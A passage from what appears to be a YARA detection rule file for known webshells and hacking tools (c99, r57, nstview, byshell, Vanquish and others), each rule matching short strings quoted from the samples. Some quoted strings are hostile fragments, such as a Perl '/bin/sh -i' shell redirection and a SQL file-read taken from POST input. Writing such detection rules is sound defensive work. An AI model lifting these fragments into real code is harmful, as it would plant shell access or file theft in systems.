		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7770-L7782"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cc5bf9fc56d404ebbc492855393d7620"
		logic_hash = "0df587ccaf41d11c6be90ef631ce8b21f95f08fa8f71e62463c378455b312f4a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Powered By "
		$s3 = " \" onClick=\"this.form.sharp.name=this.form.password.value;this.form.action=this."

	condition:
		all of them
}

rule SIGNATURE_BASE_Rdrbs084_2
{
	meta:
		description = "Webshells Auto-generated - file rdrbs084.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "97548273-6894-5c9f-8cca-d966ce770ada"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7783-L7795"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ed30327b255816bdd7590bf891aa0020"
		logic_hash = "8a743d62723c4a5f863f986edd4b149728680b40d6a4b9a99b093d62ccb70cf8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Create mapped port. You have to specify domain when using HTTP type."
		$s8 = "<LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET SERVER> <TARGET"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Caseswitch_2005_2
{
	meta:
		description = "Webshells Auto-generated - file 2005.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "0f2b8e71-1c11-5efe-bee7-146168aec369"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7796-L7814"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8bf667ee9e21366bc0bd3491cb614f41"
		logic_hash = "0ecf28b5abb918cd1d8f38b76019dddf19dff5dbb114f16ef6ec9b46cb590a46"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "MSComDlg.CommonDialog"
		$s2 = "CommonDialog1"
		$s3 = "__vbaExceptHandler"
		$s4 = "EVENT_SINK_Release"
		$s5 = "EVENT_SINK_AddRef"
		$s6 = "By Marcos"
		$s7 = "EVENT_SINK_QueryInterface"
		$s8 = "MethCallEngine"

	condition:
		all of them
}

rule SIGNATURE_BASE_Ebayid_Index3_2
{
	meta:
		description = "Webshells Auto-generated - file index3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4fc30150-7b44-53c4-888c-faf651495407"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7815-L7826"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0412b1e37f41ea0d002e4ed11608905f"
		logic_hash = "47660cb71d6787683e51aa14fc0f4a9d6f1c59517b77bfe4135098a0020ded11"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"You"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Phvayv_3
{
	meta:
		description = "Webshells Auto-generated - file phvayv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "07e027a6-01a5-5250-a35e-fbfef1449cfe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7827-L7838"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "205ecda66c443083403efb1e5c7f7878"
		logic_hash = "d0482607f7d9cf6c89963cb9b1f943fa0b80636e857e0fb044cd9a0b3f974deb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "wrap=\"OFF\">XXXX</textarea></font><font face"

	condition:
		all of them
}

rule SIGNATURE_BASE_Byshell063_Ntboot_3
{
	meta:
		description = "Webshells Auto-generated - file ntboot.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7d1f39f6-04f1-51ee-b125-c35af8ae4c0c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7839-L7853"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "99b5f49db6d6d9a9faeffb29fd8e6d8c"
		logic_hash = "2fdc930eacb87d02ebe69a2b64df4103bd0f3417a76f1b2922b3d4cd4c0dffe9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtBoot"
		$s1 = "Failure ... Access is Denied !"
		$s2 = "Dumping Description to Registry..."
		$s3 = "Opening Service .... Failure !"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Casus15_2_2
{
	meta:
		description = "Webshells Auto-generated - file casus15.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d3f67fe9-a93f-504a-8b14-a815135d562f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7854-L7865"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8d155b4239d922367af5d0a1b89533a3"
		logic_hash = "45820e0398cca8e75fc4acf6863d962a817afd95a4592acd4ac4a50029684220"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "copy ( $dosya_gonder"

	condition:
		all of them
}

rule SIGNATURE_BASE_Installer_2
{
	meta:
		description = "Webshells Auto-generated - file installer.cmd"
		author = "Florian Roth (Nextron Systems)"
		id = "681d8284-55e5-5316-a0d2-f4f13218df76"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7866-L7878"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a507919ae701cf7e42fa441d3ad95f8f"
		logic_hash = "73c1032313155ceb752fe2f94c8d242833127fe0443d7e3044fa1de2b2b7742b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Restore Old Vanquish"
		$s4 = "ReInstall Vanquish"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Remview_2_2
{
	meta:
		description = "Webshells Auto-generated - file remview.php"
		author = "Florian Roth (Nextron Systems)"
		id = "8e0492e8-d683-5c2d-b1ce-6c8344b874af"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7879-L7891"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b4a09911a5b23e00b55abe546ded691c"
		logic_hash = "0a682431f7044e9a49c8dd4842a22c521e2a07d5df045b0a12449e3b3206716b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<xmp>$out</"
		$s1 = ".mm(\"Eval PHP code\")."

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_R57_2
{
	meta:
		description = "Webshells Auto-generated - file r57.php"
		author = "Florian Roth (Nextron Systems)"
		id = "14092413-27a4-5b7d-9023-0b53b3d45a12"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7892-L7903"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "903908b77a266b855262cdbce81c3f72"
		logic_hash = "8d0f3b2009594d4aa413c4794dca12e3c66a19974cc6d0b47cc3f5e2572a4c57"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']."

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006X_2
{
	meta:
		description = "Webshells Auto-generated - file 2006X.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7904-L7916"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cf3ee0d869dd36e775dfcaa788db8e4b"
		logic_hash = "b71cf90900c7eae4caef57564292ca497a2c6c77e3de2994ba9e4cecae7f2697"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<input name=\"password\" type=\"password\" id=\"password\""
		$s6 = "name=\"theAction\" type=\"text\" id=\"theAction\""

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Phvayv_2_2
{
	meta:
		description = "Webshells Auto-generated - file phvayv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "8bd52f9b-a232-566d-90ab-4085933cdc65"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7917-L7928"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "205ecda66c443083403efb1e5c7f7878"
		logic_hash = "11418a11692412ccb309983bdadd9bda2b27b692c3282eb0386094e76c7ba1e0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "rows=\"24\" cols=\"122\" wrap=\"OFF\">XXXX</textarea></font><font"

	condition:
		all of them
}

rule SIGNATURE_BASE_Elmaliseker_2
{
	meta:
		description = "Webshells Auto-generated - file elmaliseker.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7ecf3d5c-be91-579e-905b-5f2ad03a0e42"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7929-L7941"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ccf48af0c8c09bbd038e610a49c9862e"
		logic_hash = "54c0b8e74a9b10fe54901c0595600af1dfc54abd3f710fc20ca87ca92236bb49"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "javascript:Command('Download'"
		$s5 = "zombie_array=array("

	condition:
		all of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Resolve_2
{
	meta:
		description = "Webshells Auto-generated - file resolve.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "dcdb9952-63fc-57a7-ae17-ffe8ac4271f1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7942-L7959"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "69bf9aa296238610a0e05f99b5540297"
		logic_hash = "39d8ac274e94f13b5eb197be5827a95ac09df70793bd584c96b81983a565c1ce"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "3^n6B(Ed3"
		$s1 = "^uldn'Vt(x"
		$s2 = "\\= uPKfp"
		$s3 = "'r.axV<ad"
		$s4 = "p,modoi$=sr("
		$s5 = "DiamondC8S t"
		$s6 = "`lQ9fX<ZvJW"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Remexp_3
{
	meta:
		description = "Webshells Auto-generated - file RemExp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "48a262bf-7f48-5ed9-b043-80e9d563bf21"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7960-L7973"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b69670ecdbb40012c73686cd22696eeb"
		logic_hash = "b9b966a89ab097494d7af90775bf124f1310c77145be67fa57ebdacd0164e3d0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Request.Ser"
		$s5 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f=<%=F"
		$s6 = "<td bgcolor=\"<%=BgColor%>\" align=\"right\"><%=Attributes(SubFolder.Attributes)%></"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Tool_2
{
	meta:
		description = "Webshells Auto-generated - file tool.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "ed744aa4-7a35-57d6-89bd-3286a21b50a0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7974-L7985"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3a1e1e889fdd974a130a6a767b42655b"
		logic_hash = "a3449aca3124aa4d920d78e5e674ddd9d8a181b0ce0143032352a69dfdbcad2d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "\"\"%windir%\\\\calc.exe\"\")"

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_2005_2
{
	meta:
		description = "Webshells Auto-generated - file 2005.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "91d278d5-e9ec-5a28-9a54-4549b4f0cd07"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7986-L7998"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "97f2552c2fafc0b2eb467ee29cc803c8"
		logic_hash = "4d04174b23c9057acf2618c01cd702eaaec2d3508a8c25dd87fdd320c076a3b1"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "window.open(\"\"&url&\"?id=edit&path=\"+sfile+\"&op=copy&attrib=\"+attrib+\"&dpath=\"+lp"
		$s3 = "<input name=\"dbname\" type=\"hidden\" id=\"dbname\" value=\"<%=request(\"dbname\")%>\">"

	condition:
		all of them
}

rule SIGNATURE_BASE_Byloader_2
{
	meta:
		description = "Webshells Auto-generated - file byloader.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "24940e4b-06eb-548d-9e14-1a8f9c864bd3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7999-L8014"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0f0d6dc26055653f5844ded906ce52df"
		logic_hash = "66c900e4bc771fb23d7623e57ad51edaa95696c2e31554720582f3e33a1b2e25"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtfsChk"
		$s1 = "Failure ... Access is Denied !"
		$s2 = "NTFS Disk Driver Checking Service"
		$s3 = "Dumping Description to Registry..."
		$s4 = "Opening Service .... Failure !"

	condition:
		all of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Fport_2
{
	meta:
		description = "Webshells Auto-generated - file Fport.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "664e7b19-4d0b-5062-97d2-0eb34869024d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8015-L8027"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "dbb75488aa2fa22ba6950aead1ef30d5"
		logic_hash = "b9dc66e249c0577839cc3748f129c343d2ccb7327b92a2a67e4467782d10a25e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "Copyright 2000 by Foundstone, Inc."
		$s5 = "You must have administrator privileges to run fport - exiting..."

	condition:
		all of them
}

rule SIGNATURE_BASE_Backdoor__Fr__2
{
	meta:
		description = "Webshells Auto-generated - file BackDooR (fr).php"
		author = "Florian Roth (Nextron Systems)"
		id = "fd0c77e8-18b7-5eb4-8ed4-87ee4c864683"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8028-L8039"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a79cac2cf86e073a832aaf29a664f4be"
		logic_hash = "6c16c200712015eed71aeb119e46bad5f93445a8f719d98ef31f9012cb3551ae"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "print(\"<p align=\\\"center\\\"><font size=\\\"5\\\">Exploit include "

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Ntdaddy_2
{
	meta:
		description = "Webshells Auto-generated - file ntdaddy.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "b6b655b8-7bce-5fa5-97b7-a020a7e53f4f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8040-L8051"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f6262f3ad9f73b8d3e7d9ea5ec07a357"
		logic_hash = "4df6f53ee9bfc0214e69dd858878026e962b90573ed48a5ffdd5523538e8f3bf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<input type=\"text\" name=\".CMD\" size=\"45\" value=\"<%= szCMD %>\"> <input type=\"s"

	condition:
		all of them
}

rule SIGNATURE_BASE_Nstview_Nstview_2
{
	meta:
		description = "Webshells Auto-generated - file nstview.php"
		author = "Florian Roth (Nextron Systems)"
		id = "00df601c-bddb-5da8-bef4-d2122419b5d0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8052-L8063"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3871888a0c1ac4270104918231029a56"
		logic_hash = "2b25e22d86a672af0b8957f1b0336ed80e09f3389f5045c230af2372db0e3415"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_Upload_2
{
	meta:
		description = "Webshells Auto-generated - file upload.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "43054993-b0dd-5d2e-9890-db1f47759be5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8064-L8075"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b09852bda534627949f0259828c967de"
		logic_hash = "312020a72a37adb0111ac6d61810c8e476be39dc6456e80e83cd6a680e8ea051"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- PageUpload Below -->"

	condition:
		all of them
}

rule SIGNATURE_BASE_Passwordreminder_2
{
	meta:
		description = "Webshells Auto-generated - file PasswordReminder.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "642033ee-4454-5913-8348-4d1579fc0bd8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8076-L8087"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ea49d754dc609e8bfa4c0f95d14ef9bf"
		logic_hash = "f3da5381f5e352c541654d2af918ca8cea8049d137078670dd0538a4d13f676e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "The encoded password is found at 0x%8.8lx and has a length of %d."

	condition:
		all of them
}

rule SIGNATURE_BASE_Pack_Injectt_2
{
	meta:
		description = "Webshells Auto-generated - file InjectT.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "3a640c22-0cd4-5ab1-9216-c68625d7d505"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8088-L8103"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "983b74ccd57f6195a0584cdfb27d55e8"
		logic_hash = "9f66b7b429ed585888c0fb4943bb12262247b3af8d85bc67309b27752171e66a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "ail To Open Registry"
		$s4 = "32fDssignim"
		$s5 = "vide Internet S"
		$s6 = "d]Software\\M"
		$s7 = "TInject.Dll"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Remexp_2_2
{
	meta:
		description = "Webshells Auto-generated - file RemExp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "501544d5-fe52-5933-8782-516ffe18f3ff"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8104-L8116"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b69670ecdbb40012c73686cd22696eeb"
		logic_hash = "e31e25a7c2b2e970a379a61d2dac335bd37cac48328eee9f3966ff5c77ef6f18"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = " Then Response.Write \""
		$s3 = "<a href= \"<%=Request.ServerVariables(\"script_name\")%>"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_C99_2
{
	meta:
		description = "Webshells Auto-generated - file c99.php"
		author = "Florian Roth (Nextron Systems)"
		id = "0b176370-a5ab-587a-b0e9-ef4fe5c604bd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8117-L8128"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5f9ba02eb081bba2b2434c603af454d0"
		logic_hash = "de769299bbd8b895b84db757fcc037b807f7caaa624c06e9d330934a968b2381"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "\"txt\",\"conf\",\"bat\",\"sh\",\"js\",\"bak\",\"doc\",\"log\",\"sfc\",\"cfg\",\"htacce"

	condition:
		all of them
}

rule SIGNATURE_BASE_Rknt_Zip_Folder_Rknt_2
{
	meta:
		description = "Webshells Auto-generated - file RkNT.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "a58a3b33-8096-535a-b930-2eb71347edb8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8129-L8146"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5f97386dfde148942b7584aeb6512b85"
		logic_hash = "59de8a40a7081ee5fbea9f413590237c1da9985f2352b32571529baf38c93ddb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "PathStripPathA"
		$s1 = "`cLGet!Addr%"
		$s2 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
		$s3 = "oQToOemBuff* <="
		$s4 = "ionCdunAsw[Us'"
		$s6 = "CreateProcessW: %S"
		$s7 = "ImageDirectoryEntryToData"

	condition:
		all of them
}

rule SIGNATURE_BASE_Dbgntboot_2
{
	meta:
		description = "Webshells Auto-generated - file dbgntboot.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "6b9381e6-597d-5e74-a318-9931d20a9d08"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8147-L8159"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "4d87543d4d7f73c1529c9f8066b475ab"
		logic_hash = "10f86f18aff4995928efb3c8000eca166fe37e6006de7938139cad718ff7653f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "now DOS is working at mode %d,faketype %d,against %s,has worked %d minutes,by sp"
